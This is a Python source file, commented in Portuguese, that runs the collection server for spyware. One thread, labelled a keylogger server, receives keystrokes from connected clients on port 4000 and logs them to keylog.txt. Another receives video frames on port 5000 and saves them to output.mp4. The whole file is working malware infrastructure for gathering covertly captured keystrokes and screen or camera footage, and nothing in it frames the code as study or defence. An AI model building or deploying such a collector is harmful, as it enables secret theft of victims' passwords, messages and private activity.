import socket
import os
import cv2
import numpy as np

SERVER_IP = "127.0.0.1"
VIDEO_PORT = 5000
KEYLOG_PORT = 4000

KEYLOG_FILE = "keylog.txt"
OUTPUT_VIDEO = "output.mp4"

# Criar socket do servidor
def criar_socket(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_IP, port))
    server_socket.listen(1)
    print(f"🔵 Servidor ouvindo na porta {port}")
    return server_socket

# Servidor de Keylogger (PORTA 4000)
def servidor_keylogger():
    keylog_socket = criar_socket(KEYLOG_PORT)

    while True:
        client_socket, client_address = keylog_socket.accept()
        print(f"🔴 Conexão de keylogger estabelecida com {client_address}")

        with open(KEYLOG_FILE, "a") as f:
            try:
                while True:
                    data = client_socket.recv(1024).decode('utf-8')
                    if not data:
                        break
                    f.write(data)
                    print(f"🔴 Tecla recebida: {data.strip()}")
            except Exception as e:
                print(f"🔴 Erro no keylogger: {e}")
            finally:
                client_socket.close()
                print(f"🔴 Conexão encerrada. Log salvo em {KEYLOG_FILE}")

# Rodando o servidor de keylogger em uma **Thread separada**
import threading

keylog_thread = threading.Thread(target=servidor_keylogger, daemon=True)
keylog_thread.start()

# Agora, rodamos o servidor de vídeo (PORTA 5000)
server_socket = criar_socket(VIDEO_PORT)

# Definir o codec e inicializar o VideoWriter
video_writer = None

while True:
    client_socket, client_address = server_socket.accept()
    print(f"📹 Conexão de vídeo estabelecida com {client_address}")

    try:
        while True:
            frame_size_data = client_socket.recv(4)
            if not frame_size_data:
                break

            frame_size = int.from_bytes(frame_size_data, 'big')
            frame_data = b""

            while len(frame_data) < frame_size:
                chunk = client_socket.recv(frame_size - len(frame_data))
                if not chunk:
                    break
                frame_data += chunk

            if not frame_data:
                break

            # Converter os bytes do frame para uma imagem OpenCV
            nparr = np.frombuffer(frame_data, np.uint8)
            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

            # Inicializar o VideoWriter na primeira vez
            if video_writer is None:
                height, width, _ = frame.shape
                fourcc = cv2.VideoWriter_fourcc(*'XVID')  # Codec para MP4
                video_writer = cv2.VideoWriter(OUTPUT_VIDEO, fourcc, 30.0, (width, height))

            # Escrever o frame no vídeo
            video_writer.write(frame)
            print(f"📹 Frame adicionado ao vídeo.")

    except Exception as e:
        print(f"📹 Erro no vídeo: {e}")
    finally:
        client_socket.close()
        print(f"📹 Conexão de vídeo encerrada.")

        # Fechar o VideoWriter corretamente
        if video_writer is not None:
            video_writer.release()
            print(f"📹 Vídeo salvo como {OUTPUT_VIDEO}")
            video_writer = None  # Resetar para permitir futuras conexões
